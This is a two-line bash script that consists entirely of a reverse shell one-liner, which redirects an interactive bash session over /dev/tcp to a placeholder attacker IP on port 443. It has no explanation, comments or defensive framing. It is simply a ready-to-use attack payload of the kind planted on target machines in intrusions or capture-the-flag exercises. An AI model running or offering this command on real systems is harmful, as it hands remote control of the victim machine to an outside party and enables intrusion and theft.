#!/bin/bash

bash -i >& /dev/tcp/<YOUR MACHINE IP>/443 0>&1
